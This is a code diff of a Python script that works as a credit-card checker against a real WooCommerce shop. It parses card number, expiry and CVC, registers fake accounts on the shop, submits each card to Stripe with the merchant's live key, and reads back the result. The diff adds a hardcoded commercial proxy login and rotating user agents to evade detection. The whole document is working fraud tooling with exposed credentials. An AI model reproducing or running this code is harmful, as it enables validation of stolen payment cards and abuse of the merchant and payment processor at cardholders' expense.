@@ -2,6 +2,7 @@ import random
 import string
 import requests
 from user_agent import generate_user_agent
+from proxy import reqproxy, make_request
 import json
 import re
 
@@ -33,6 +34,9 @@ def generate_random_code(length=32):
 
 #============================================
 def Tele(ccx):
+    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
+    session, ip = reqproxy(proxy_str)
+    #print(f"IP Address: {ip}")
     ccx=ccx.strip()
     n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
@@ -70,10 +74,10 @@ def Tele(ccx):
         'sec-fetch-site': 'none',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
-    response = requests.get('https://littleplumber.com/my-account/add-payment-method/', headers=headers)
+    response = session.get('https://littleplumber.com/my-account/add-payment-method/', headers=headers)
     
     register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
     #print(response.text)
@@ -116,7 +120,7 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     data = {
@@ -142,7 +146,7 @@ def Tele(ccx):
         'register': 'Register',
     }
     
-    response = requests.post('https://littleplumber.com/my-account/add-payment-method/', #cookies=cookies, 
+    response = session.post('https://littleplumber.com/my-account/add-payment-method/', #cookies=cookies, 
     headers=headers, data=data)
     
     ajax = re.search(r'"createSetupIntentNonce":"(.*?)"', response.text).group(1)
@@ -161,7 +165,7 @@ def Tele(ccx):
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     data = f'billing_details[name]=+&billing_details[email]=genpaypal{nr}%40gmail.com&billing_details[address][country]=TH&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flittleplumber.com&time_on_page=38078&client_attribution_metadata[client_session_id]=aa2c564b-3d72-477d-a40b-5af1ccb3d821&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1MIOMzg9gNI&client_attribution_metadata[elements_session_config_id]=0d8d5b97-daac-4a5f-a8d9-ee9f2c0cf806&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=af465798-0ff9-4fa2-938d-7172e5e3e8be092091&muid=6b45b5ae-4176-4bc9-9018-a4eac7de9db9a972ff&sid=64702de4-7a64-4ded-9974-75f048a7181aa4c69d&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1QbfJaFjtVwVrTS7'
@@ -210,7 +214,7 @@ def Tele(ccx):
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     files = {
@@ -219,7 +223,7 @@ def Tele(ccx):
         '_ajax_nonce': (None, f'{ajax}'),
     }
     
-    response = requests.post('https://littleplumber.com/wp-admin/admin-ajax.php', #cookies=cookies, 
+    response = session.post('https://littleplumber.com/wp-admin/admin-ajax.php', #cookies=cookies, 
     headers=headers, files=files)
     try:
         result = re.search(r'"message":"(.*?)"', response.text).group(1)
